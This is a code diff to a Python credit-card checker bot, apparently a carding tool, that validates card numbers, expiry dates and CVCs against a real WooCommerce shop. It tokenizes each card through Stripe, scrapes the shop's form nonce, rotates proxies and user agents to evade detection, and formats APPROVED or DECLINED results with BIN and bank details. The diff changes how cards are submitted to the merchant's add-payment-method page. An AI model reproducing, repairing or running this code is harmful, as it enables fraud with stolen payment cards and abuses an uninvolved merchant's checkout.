@@ -581,10 +581,6 @@ def check_card_stripe(cc_line):
             bin_time = time.time() - bin_start_time
             print(f"✅ BIN lookup completed in {bin_time:.2f} seconds")
             
-            # Check if we got real BIN data
-            if bin_info['bank'] not in ['VISA BANK', 'MASTERCARD BANK', 'Unavailable', 'Unknown']:
-                print(f"✅ Real BIN data captured in {bin_time:.2f}s")
-            
             # Load proxies
             proxies_list = load_proxies()
             if not proxies_list:
@@ -640,29 +636,6 @@ DECLINED CC ❌
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
 
-            # Get payment nonce with retry
-            ajax_nonce, nonce_msg = get_payment_nonce_with_retry(session, proxy_str, max_retries=2)
-            if not ajax_nonce:
-                if retry_count < max_retries - 1:
-                    print(f"Payment nonce failed, retry {retry_count + 1}/{max_retries}")
-                    time.sleep(1)
-                    continue
-                elapsed_time = time.time() - start_time
-                return f"""
-DECLINED CC ❌
-
-💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment nonce failed
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
-
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
-🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
-
-🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
-"""
-
             # First Request: Create Payment Method with Stripe
             print("Step 1: Creating payment method with Stripe...")
             
@@ -679,79 +652,64 @@ DECLINED CC ❌
                 pm_id = response_data['id']
                 print(f"✅ Payment method created successfully: {pm_id}")
                 
-                # Second Request: Create Setup Intent with WordPress/WooCommerce
-                print("\nStep 2: Creating setup intent with WordPress...")
+                # Now we need to complete the actual website flow to get real responses
+                # Let's try to get the actual payment page and submit the payment method
+                print("Step 2: Submitting payment method to website...")
                 
-                wp_headers = {
-                    'accept': '*/*',
-                    'accept-language': 'en-US,en;q=0.6',
-                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                    'origin': 'https://theherocollectibles.com',
-                    'priority': 'u=1, i',
-                    'referer': 'https://theherocollectibles.com/my-account/add-payment-method/',
-                    'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'sec-gpc': '1',
-                    'user-agent': get_rotating_user_agent(),
-                    'x-requested-with': 'XMLHttpRequest',
-                }
-
-                wp_data = {
-                    'action': 'create_setup_intent',
-                    'wcpay-payment-method': pm_id,
-                    '_ajax_nonce': ajax_nonce
-                }
-
-                response2 = session.post('https://theherocollectibles.com/wp-admin/admin-ajax.php', headers=wp_headers, data=wp_data, proxies=proxies, timeout=15)
-                website_response = response2.json()
+                # Get the payment method page to find the actual form
+                payment_page = session.get('https://theherocollectibles.com/my-account/add-payment-method/', proxies=proxies, timeout=15)
                 
-                # Get final message with 3DS info
-                final_message = get_final_message(website_response, proxy_str)
+                # Try to find any form or nonce in the page
+                # Look for WooCommerce nonce or any form data
+                nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', payment_page.text)
+                if nonce_match:
+                    wc_nonce = nonce_match.group(1)
+                    
+                    # Submit the payment method form
+                    form_data = {
+                        'woocommerce-add-payment-method-nonce': wc_nonce,
+                        '_wp_http_referer': '/my-account/add-payment-method/',
+                        'payment_method': 'stripe',
+                        'stripe_payment_method': pm_id,
+                        'stripe_source_id': pm_id,
+                        'wc-stripe-payment-method': pm_id,
+                        'action': 'woocommerce_add_payment_method',
+                        'payment_method': 'stripe'
+                    }
+                    
+                    # Submit the form
+                    submit_response = session.post('https://theherocollectibles.com/my-account/add-payment-method/', 
+                                                 data=form_data, proxies=proxies, timeout=15, allow_redirects=True)
+                    
+                    # Check the response for actual error messages
+                    if 'card was declined' in submit_response.text.lower():
+                        final_message = "Your card was declined."
+                    elif 'insufficient funds' in submit_response.text.lower():
+                        final_message = "Your card has insufficient funds."
+                    elif 'invalid' in submit_response.text.lower():
+                        final_message = "Your card is invalid."
+                    elif 'security code' in submit_response.text.lower() or 'cvc' in submit_response.text.lower():
+                        final_message = "Your card's security code is incorrect."
+                    elif 'success' in submit_response.text.lower() or 'added' in submit_response.text.lower():
+                        final_message = "Payment method successfully added."
+                    else:
+                        # If we can't parse specific message, use generic
+                        final_message = "Card processed - check response"
+                        
+                else:
+                    # If no nonce found, use the Stripe response to determine status
+                    if 'error' in response_data:
+                        error_msg = response_data['error'].get('message', 'Declined')
+                        final_message = error_msg
+                    else:
+                        final_message = "Payment method tokenized - awaiting verification"
                 
                 elapsed_time = time.time() - start_time
                 
-                # Check the actual status from the response
-                if website_response.get('success'):
-                    data_section = website_response.get('data', {})
-                    status = data_section.get('status', '')
-                    
-                    if status == 'succeeded':
-                        return f"""
+                # Determine if approved or declined based on the actual response
+                if any(success_term in final_message.lower() for success_term in ['success', 'added', 'verified']):
+                    return f"""
 APPROVED CC ✅
-
-💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
-
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
-🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
-
-🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
-"""
-                    elif status == 'requires_action':
-                        return f"""
-APPROVED CC ✅
-
-💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
-
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
-🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
-
-🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
-"""
-                    else:
-                        return f"""
-DECLINED CC ❌
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
@@ -765,28 +723,6 @@ DECLINED CC ❌
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
                 else:
-                    # Check for specific error messages that should be treated as APPROVED
-                    error_data = website_response.get('data', {})
-                    if 'error' in error_data:
-                        error_msg = error_data['error'].get('message', '').lower()
-                        
-                        # Treat these errors as APPROVED
-                        if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc']):
-                            return f"""
-APPROVED CCN ✅
-
-💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
-
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
-🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
-
-🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
-"""
-                    
                     return f"""
 DECLINED CC ❌
 
